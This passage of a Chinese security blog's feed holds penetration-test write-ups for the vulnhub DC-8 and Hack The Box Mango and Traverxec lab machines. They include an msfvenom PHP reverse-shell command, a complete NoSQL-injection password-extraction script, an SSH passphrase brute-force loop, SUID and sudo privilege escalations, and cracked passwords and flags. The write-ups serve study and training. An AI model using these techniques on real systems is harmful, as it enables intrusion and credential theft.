08:00:27:A8:B6:73 (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre><p>打开80端口发现是drupal,扫描到后台 <a href="http://192.168.56.102/user" target="_blank" rel="noopener">http://192.168.56.102/user</a> ，并且发现了可疑注入点</p><p><img src="/posts/24a0544e/1583216887452.png" alt></p><p>sqlmap注入</p><p><img src="/posts/24a0544e/1583217015158.png" alt></p><p>得到用户名和密码</p><pre><code>+-------+---------------------------------------------------------+| name  | pass                                                    |+-------+---------------------------------------------------------+| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z || john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |+-------+---------------------------------------------------------+</code></pre><p>不过密码是hash过的，使用john爆破，只有 <code>john</code> 用户的密码可以爆破出来 <code>turtle</code></p><h2 id="后台getshell"><a href="#后台getshell" class="headerlink" title="后台getshell"></a>后台getshell</h2><p>修改页面</p><p><img src="/posts/24a0544e/1583217110935.png" alt></p><pre><code>msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.56.1 lport=4444 -f raw  -o shell.php</code></pre><p>生成 shell ，修改</p><p><img src="/posts/24a0544e/1583217170125.png" alt></p><p>修改完之后，提交表单</p><p><img src="/posts/24a0544e/1583217222343.png" alt></p><p>成功getshell</p><p><img src="/posts/24a0544e/1583217261982.png" alt></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>寻找 SUID</p><pre><code>www-data@dc-8:/tmp$ find / -perm -u=s -type f 2&gt;/dev/null find / -perm -u=s -type f 2&gt;/dev/null                     /usr/bin/chfn                                             /usr/bin/gpasswd                                          /usr/bin/chsh                                             /usr/bin/passwd                                           /usr/bin/sudo                                             /usr/bin/newgrp                                           /usr/sbin/exim4                                           /usr/lib/openssh/ssh-keysign                              /usr/lib/eject/dmcrypt-get-device                         /usr/lib/dbus-1.0/dbus-daemon-launch-helper               /bin/ping                                                 /bin/su                                                   /bin/umount                                               /bin/mount                                                </code></pre><p>发现了 <code>exim4</code> ,这是一个邮件程序</p><p>搜索相关的 exploit</p><p><img src="/posts/24a0544e/1583217430342.png" alt></p><p>将 <code>46996.sh</code> 上传到靶机上，注意需要修改一下文件格式为 <code>unix</code></p><pre><code>set ff=unix</code></pre><p><img src="/posts/24a0544e/1583217742979.png" alt></p><p>最后得到flag</p><p><img src="/posts/24a0544e/1583217755873.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;nmap扫描结果&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;PORT   STATE SERVICE  VERSION
22/tcp o
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="靶机" scheme="http://prontosil.com/tags/%E9%9D%B6%E6%9C%BA/"/>
    
      <category term="vulnhub" scheme="http://prontosil.com/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>HTB mango靶机实战</title>
    <link href="http://prontosil.com/posts/73230382/"/>
    <id>http://prontosil.com/posts/73230382/</id>
    <published>2020-02-29T09:04:17.000Z</published>
    <updated>2020-02-29T09:16:50.197Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22端口，80端口，443端口</p><p><img src="/posts/73230382/1582967083509.png" alt></p><p>这里改一下host</p><pre><code>staging-order.mango.htb</code></pre><p>访问网站</p><p><img src="/posts/73230382/1582967236329.png" alt></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>有点坑，是mongodb，nosql注入</p><p><img src="/posts/73230382/1582967256341.png" alt></p><p>参考爆破脚本</p><pre><code class="python">#!/usr/bin/env python  import requests  import string  url = &quot;http://staging-order.mango.htb/index.php&quot;  headers = {&quot;Host&quot;: &quot;staging-order.mango.htb&quot;}  cookies = {&quot;PHPSESSID&quot;: &quot;9k6j39np56td4vq3q4lg4eh95j&quot;}  possible_chars = list(string.ascii_letters) + list(string.digits) + [&quot;\\&quot;+c for c in string.punctuation+string.whitespace ]  def get_password(username):      print(&quot;Extracting password of &quot; + username)      params = {&quot;username&quot;:username, &quot;password[$regex]&quot;:&quot;&quot;, &quot;login&quot;: &quot;login&quot;}      password = &quot;^&quot;      while True:          for c in possible_chars:              params[&quot;password[$regex]&quot;] = password + c + &quot;.*&quot;              pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False)              if int(pr.status_code) == 302:                  password += c                  break          if c == possible_chars[-1]:              print (&quot;Found password &quot;+password[1:].replace(&quot;\\&quot;, &quot;&quot;)+&quot; for username &quot;+username)              return password[1:].replace(&quot;\\&quot;, &quot;&quot;)  def get_usernames():      usernames = []      params = {&quot;username[$regex]&quot;:&quot;&quot;, &quot;password[$regex]&quot;:&quot;.*&quot;, &quot;login&quot;: &quot;login&quot;}      for c in possible_chars:          username = &quot;^&quot; + c          params[&quot;username[$regex]&quot;] = username + &quot;.*&quot;          pr = requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False)          if int(pr.status_code) == 302:              print(&quot;Found username starting with &quot;+c)              while True:                  for c2 in possible_chars:                      params[&quot;username[$regex]&quot;] = username + c2 + &quot;.*&quot;                      if int(requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False).status_code) == 302:                          username += c2                          print(username)                          break                  if c2 == possible_chars[-1]:                      print(&quot;Found username: &quot; +username[1:])                      usernames.append(username[1:])                      break      return usernames  for u in get_usernames():      get_password(u)  </code></pre><p>爆出密码</p><p><img src="/posts/73230382/1582967279320.png" alt></p><pre><code>Found username: mangoExtracting password of adminFound password t9KcS3&gt;!0B#2 for username adminExtracting password of mangoFound password h3mXK8RhU~f{]f5H for username mango</code></pre><p>使用mango用户登陆</p><p><img src="/posts/73230382/1582967292499.png" alt></p><p>切换为admin</p><p><img src="/posts/73230382/1582967301413.png" alt></p><pre><code>userflag$ cat user.txt79bf31c6c6eb38a8567832f7f8b47e92</code></pre><h2 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h2><p><code>sudo -l</code> 试一下</p><p><img src="/posts/73230382/1582967336806.png" alt></p><pre><code>find / -user root -perm -4000 2&gt;/dev/null</code></pre><p>寻找SUID</p><p><img src="/posts/73230382/1582967364061.png" alt></p><p>根据<a href="https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt" target="_blank" rel="noopener">https://gtfobins.github.io/gtfobins/jjs/可直接读取到root.txt</a></p><p><img src="/posts/73230382/1582967372531.png" alt></p><pre><code class="bash">Warning: The jjs tool is planned to be removed from a future JDK releasejjs&gt; var BufferedReader = Java.type(&quot;java.io.BufferedReader&quot;);jjs&gt; var FileReader = Java.type(&quot;java.io.FIleReader&quot;);java.lang.RuntimeException: java.lang.ClassNotFoundException: java.io.FIleReaderjjs&gt; var FileReader = Java.type(&quot;java.io.FileReader&quot;);jjs&gt; var br = new BufferedReader(new FileReader(&quot;/root/root.txt&quot;));jjs&gt; while((line=br.readline())!=null){print(line);}&lt;shell&gt;:1 TypeError: br.readline is not a functionjjs&gt; while((line=br.readLine())!=null){print(line);}8a8ef79a7a2fbb01ea81688424e9ab15</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;22端口，80端口，443端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/posts/73230382/1582967083509
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="HTB" scheme="http://prontosil.com/tags/HTB/"/>
    
      <category term="靶机" scheme="http://prontosil.com/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB Traverxec靶机实战</title>
    <link href="http://prontosil.com/posts/d5bfc2a3/"/>
    <id>http://prontosil.com/posts/d5bfc2a3/</id>
    <published>2020-02-29T08:55:13.000Z</published>
    <updated>2020-02-29T09:16:50.196Z</updated>
    
    <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>22号端口和80号端口</p><p><img src="/posts/d5bfc2a3/1582966595850.png" alt></p><p>看到http的信息是 <code>nostromo</code>,msf搜索exploit直接打</p><p><img src="/posts/d5bfc2a3/1582966633536.png" alt="成功得到meterpreter"></p><h2 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h2><p>由于是 <code>nostromo</code> 搭建的，根目录 在 <code>/var/nostromo</code> </p><p><img src="/posts/d5bfc2a3/1582966671887.png" alt></p><p>查找conf目录</p><p><img src="/posts/d5bfc2a3/1582966693102.png" alt></p><p>查看配置文件 <code>nhttpd.conf</code></p><p><img src="/posts/d5bfc2a3/1582966726837.png" alt></p><p>发现根目录是在 public_www 下<br>是在家目录下，这个权限配置很有意思，你只能进去却看不到</p><p><img src="/posts/d5bfc2a3/1582966745190.png" alt></p><p>下载压缩包下来 <code>/home/david/public_www/protected-file-area/backup-ssh-identity-files.tgz</code></p><p>解压之后就得到了私钥，但是尝试登陆还是需要密码</p><p><img src="/posts/d5bfc2a3/1582966789646.png" alt></p><p>这里就需要爆破了</p><p>可以使用john，首先需要 <code>python ssh2john.py id_rsa &gt; rsacrack</code> 转一下。但是这种方式太慢了，换一种，折耳根payload记一下</p><pre><code>cat /usr/share/john/password.lst | while read pass; do if ssh-keygen -c -C &quot;david@10.10.10.165&quot; -P $pass -f id_rsa &amp;&gt;/dev/null; then echo $pass; break; fi; done</code></pre><p><img src="/posts/d5bfc2a3/1582966833790.png" alt></p><p>然后登陆 密码是 hunter</p><p><img src="/posts/d5bfc2a3/1582966848699.png" alt></p><pre><code>david@traverxec:~$ cat user.txt7db0b48469606a42cec20750d9782f3d</code></pre><p>得到flag</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>看到一个文件</p><pre><code class="bash">david@traverxec:~/bin$ cat server-stats.head                                                                                                                     .----.                                                                     .---------. | == |          Webserver Statistics and Data                              |.-&quot;&quot;&quot;&quot;&quot;-.| |----|                Collection Script                                    ||       || | == |                 (c) David, 2019                                     ||       || |----|                                                                     |&#39;-.....-&#39;| |::::|                                                                     &#39;&quot;&quot;)---(&quot;&quot;&#39; |___.|                                                                    /:::::::::::\&quot;    &quot;                                                                   /:::=======:::\                                                                    jgs &#39;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&#39;            david@traverxec:~/bin$ cat server-stats.sh                                             #!/bin/bash                                                                            cat /home/david/bin/server-stats.head                                                  echo &quot;Load: `/usr/bin/uptime`&quot;                                                         echo &quot; &quot;                                                                               echo &quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&quot;               echo &quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&quot;    echo &quot; &quot;                                                                               echo &quot;Last 5 journal log lines:&quot;                                                       /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat                </code></pre><p>发现 <code>journalctl</code> 是用sudo执行的</p><p>提权： <code>/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service</code></p><pre><code># cat root.txt9aa36a6d76f785dfd320a478f6e0d906</code></pre><p><img src="/posts/d5bfc2a3/1582966978146.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>整体下来感觉还行，还是要扩大知识面</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信息收集&lt;/h2&gt;&lt;p&gt;22号端口和80号端口&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/posts/d5bfc2a3/1582966595850.png
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://prontosil.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="HTB" scheme="http://prontosil.com/tags/HTB/"/>
    
      <category term="靶机" scheme="http://prontosil.com/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>每天一道leetcode-最长回文字串</title>
    <link href="http://prontosil.com/posts/a99288c/"/>
    <id>http://prontosil.com/posts/a99288c/</id>
    <published>2020-02-10T14:26:19.000Z</published>
    <updated>2020-02-29T09:16:50.199Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
    
  </entry>
  
</feed>
